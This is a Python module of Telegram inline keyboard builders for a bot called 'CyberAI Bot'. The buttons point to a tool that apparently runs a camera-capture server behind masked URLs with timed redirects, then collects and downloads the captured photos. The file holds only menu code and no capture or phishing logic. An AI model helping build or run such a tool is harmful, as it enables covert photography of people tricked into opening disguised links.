"""
CyberAI Bot — Inline Keyboard Builders
All Telegram InlineKeyboardMarkup factories in one place.
"""

from telegram import InlineKeyboardButton, InlineKeyboardMarkup


def main_menu_keyboard():
    """Main menu with all features."""
    keyboard = [
        [
            InlineKeyboardButton("📷 Camera Capture", callback_data="menu_cam"),
            InlineKeyboardButton("🔗 URL Masker", callback_data="menu_masker"),
        ],
        [
            InlineKeyboardButton("📷+🔗 Cam + Masker", callback_data="menu_cam_masker"),
        ],
        [
            InlineKeyboardButton("📂 View Captures", callback_data="menu_captures"),
            InlineKeyboardButton("📋 View Logs", callback_data="menu_logs"),
        ],
        [
            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings"),
            InlineKeyboardButton("❓ Help", callback_data="menu_help"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def camera_mode_keyboard():
    """Camera mode selection: front / back / both."""
    keyboard = [
        [
            InlineKeyboardButton("📱 Front", callback_data="cam_mode_front"),
            InlineKeyboardButton("📷 Back", callback_data="cam_mode_back"),
            InlineKeyboardButton("🔄 Both", callback_data="cam_mode_both"),
        ],
        [back_button(), home_button()],
    ]
    return InlineKeyboardMarkup(keyboard)


def confirmation_keyboard(prefix="confirm"):
    """Start / Cancel confirmation."""
    keyboard = [
        [
            InlineKeyboardButton("✅ Start", callback_data=f"{prefix}_yes"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"{prefix}_no"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def server_control_keyboard():
    """Controls while the camera server is running."""
    keyboard = [
        [
            InlineKeyboardButton("⏹ Stop Server", callback_data="cam_stop"),
            InlineKeyboardButton("📸 View Captures", callback_data="cam_view_captures"),
        ],
        [
            InlineKeyboardButton("📊 Status", callback_data="cam_status"),
            InlineKeyboardButton("🔗 Mask URL", callback_data="cam_mask_url"),
        ],
        [home_button()],
    ]
    return InlineKeyboardMarkup(keyboard)


def mask_result_keyboard():
    """Actions after URL masking is complete."""
    keyboard = [
        [
            InlineKeyboardButton("🔄 Mask Another", callback_data="menu_masker"),
            InlineKeyboardButton("🏠 Home", callback_data="go_home"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def captures_action_keyboard():
    """Actions for the captures viewer."""
    keyboard = [
        [
            InlineKeyboardButton("📥 Download All (ZIP)", callback_data="captures_zip"),
            InlineKeyboardButton("🗑 Clear All", callback_data="captures_clear"),
        ],
        [
            InlineKeyboardButton("📸 Latest 5", callback_data="captures_latest"),
            InlineKeyboardButton("📸 Latest 20", callback_data="captures_latest_20"),
        ],
        [back_button(), home_button()],
    ]
    return InlineKeyboardMarkup(keyboard)


def logs_action_keyboard():
    """Actions for the logs viewer."""
    keyboard = [
        [
            InlineKeyboardButton("📄 View Log", callback_data="logs_view"),
            InlineKeyboardButton("📥 Download Log", callback_data="logs_download"),
        ],
        [
            InlineKeyboardButton("🗑 Clear Log", callback_data="logs_clear"),
        ],
        [back_button(), home_button()],
    ]
    return InlineKeyboardMarkup(keyboard)


def settings_keyboard():
    """Settings menu."""
    keyboard = [
        [
            InlineKeyboardButton("📷 Default Camera Mode", callback_data="settings_cam_mode"),
        ],
        [
            InlineKeyboardButton("⏱ Default Redirect Time", callback_data="settings_redirect_time"),
        ],
        [
            InlineKeyboardButton("🔔 Notifications", callback_data="settings_notifications"),
        ],
        [
            InlineKeyboardButton("🗑 Clear All Data", callback_data="settings_clear_all"),
        ],
        [home_button()],
    ]
    return InlineKeyboardMarkup(keyboard)


def confirm_clear_keyboard(target="captures"):
    """Confirmation for destructive actions."""
    keyboard = [
        [
            InlineKeyboardButton("⚠️ Yes, Delete", callback_data=f"clear_{target}_yes"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"clear_{target}_no"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def skip_keyboard():
    """Skip button for optional inputs."""
    keyboard = [
        [InlineKeyboardButton("⏭ Skip", callback_data="input_skip")],
        [cancel_button()],
    ]
    return InlineKeyboardMarkup(keyboard)


def back_home_keyboard():
    """Back + Home navigation."""
    keyboard = [
        [back_button(), home_button()],
    ]
    return InlineKeyboardMarkup(keyboard)


def home_only_keyboard():
    """Just a Home button."""
    keyboard = [
        [home_button()],
    ]
    return InlineKeyboardMarkup(keyboard)


# ── Button Helpers ────────────────────────────────────────────

def back_button():
    return InlineKeyboardButton("◀️ Back", callback_data="go_back")

def home_button():
    return InlineKeyboardButton("🏠 Home", callback_data="go_home")

def cancel_button():
    return InlineKeyboardButton("❌ Cancel", callback_data="go_cancel")
